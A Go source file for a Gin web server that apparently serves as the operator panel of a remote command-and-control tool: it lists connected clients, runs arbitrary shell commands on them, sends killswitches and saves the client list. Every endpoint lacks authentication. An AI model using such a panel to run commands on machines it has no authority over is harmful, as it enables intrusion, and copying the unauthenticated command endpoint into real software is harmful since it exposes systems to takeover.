package cmd

import (
	"embed"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
)

var (
	WebPort string = "8080"
)

//go:embed templates/*
var templatesFolder embed.FS

func WebServer() {
	p := viper.GetString("Server.WebPort")
	if p != "" {
		WebPort = p
	}
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	LoadHTMLFromEmbedFS(r, templatesFolder, "templates/*.html")
	r.StaticFileFS("/style.css", "./templates/style.css", http.FS(templatesFolder))
	r.StaticFileFS("/htmx.js", "./templates/htmx.js", http.FS(templatesFolder))
	setFavicons(r)

	r.GET("/", getRoot)
	r.GET("/command/:clientid", getCommands)
	r.POST("/command/:clientid", execCMD)
	r.POST("/kill/:clientid", sendKillswitch)
	r.GET("/dump", dumpClients)
	r.POST("/save", saveClients)
	r.POST("/remove/:clientid", removeClient)
	r.POST("/bulk-kill", bulkKill)
	r.POST("/bulk-remove/", bulkRemove)

	// Start
	r.Run(":" + WebPort)
}

func bulkKill(c *gin.Context) {
	list := Bulk{}
	c.ShouldBind(&list)
	if len(list.ClientIDs) == 0 {
		return
	}
	for _, v := range list.ClientIDs {
		genericKillswitch(v)
	}
}

func bulkRemove(c *gin.Context) {
	list := Bulk{}
	c.ShouldBind(&list)
	if len(list.ClientIDs) == 0 {
		return
	}
	for _, v := range list.ClientIDs {
		genericRemoveClient(v)
	}
}

func dumpClients(c *gin.Context) {
	jsonClients := marshalClients()
	c.IndentedJSON(http.StatusOK, jsonClients)
}

func saveClients(c *gin.Context) {
	log.Println("Saving clients...")
	jsonClients := marshalClients()
	fileToSaveTo, err := setClientPath()
	if err != nil {
		log.Print(err)
		return
	}

	f, err := os.Create(fileToSaveTo)
	if err != nil {
		log.Print(err)
		return
	}
	defer f.Close()
	as_json, _ := json.MarshalIndent(jsonClients, "", "\t")
	f.Write(as_json)
	log.Println("Success!")
}

func removeClient(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	genericRemoveClient(intClientID)
}

func genericRemoveClient(id int) {
	client, id, err := returnClient(id)
	if err != nil {
		return
	}

	if client.IsOnline == true {
		client.Instruct(Instructions{
			IsKillswitch: true,
		})
	}

	log.Printf("Removing client %v\n", id)
	if len(clientList) != 1 {
		clientList = append(clientList[:id], clientList[id+1:]...)
	} else {
		clientList = nil
	}
	log.Printf("Success!")
}

func marshalClients() ClientJSON {
	jsonClients := ClientJSON{Date: time.Now()}
	for _, v := range clientList {
		jsonClients.List = append(jsonClients.List, v.ClientBasicInfo)
	}
	return jsonClients
}

func getRoot(c *gin.Context) {
	c.HTML(http.StatusOK, "templates/index.html", gin.H{
		"Clients": clientList,
	})
}

func getCommands(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	client, _, err := returnClient(intClientID)
	if err != nil {
		c.String(http.StatusNotFound, "Client not found")
		return
	}
	c.HTML(http.StatusOK, "templates/command.html", gin.H{
		"Client": client,
	})
}

func sendKillswitch(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	genericKillswitch(intClientID)
}

func genericKillswitch(id int) {
	_, id, err := returnClient(id)
	if err != nil {
		return
	}

	if clientList[id].IsOnline == false {
		return
	}

	inst := Instructions{
		IsKillswitch: true,
	}
	clientList[id].Instruct(inst)
	clientList[id].IsOnline = false
}

func execCMD(c *gin.Context) {
	id := c.Param("clientid")
	idInt, err := strconv.Atoi(id)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
		return
	}

	client, _, err := returnClient(idInt)
	if err != nil {
		return
	}

	if client.IsOnline == false {
		c.String(http.StatusOK, "Client is currently offline!")
		return
	}

	command, _ := c.GetPostForm("cmd")

	out, err := sendCommand(*client, command)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		c.String(http.StatusOK, e)
		return
	}
	prettyOut := strings.Replace(out, "\n", "<br>", -1)
	c.String(http.StatusOK, "$ "+command+"<br>"+prettyOut)
}

func setFavicons(r *gin.Engine) {
	r.StaticFileFS("/favicon.ico", "./templates/assets/favicon.ico", http.FS(templatesFolder))
	r.StaticFileFS("/favicon-32x32.png", "./templates/assets/favicon-32x32.png", http.FS(templatesFolder))
	r.StaticFileFS("/favicon-16x16.png", "./templates/assets/favicon-16x16.png", http.FS(templatesFolder))
	r.StaticFileFS("/apple-touch-icon.png", "./templates/assets/apple-touch-icon.png", http.FS(templatesFolder))
	r.StaticFileFS("/android-chrome-512x512.png", "./templates/assets/android-chrome-512x512.png", http.FS(templatesFolder))
	r.StaticFileFS("/android-chrome-192x192.png", "./templates/assets/android-chrome-192x192.png", http.FS(templatesFolder))
	r.StaticFileFS("/site.webmanifest", "./templates/assets/site.webmanifest", http.FS(templatesFolder))
}
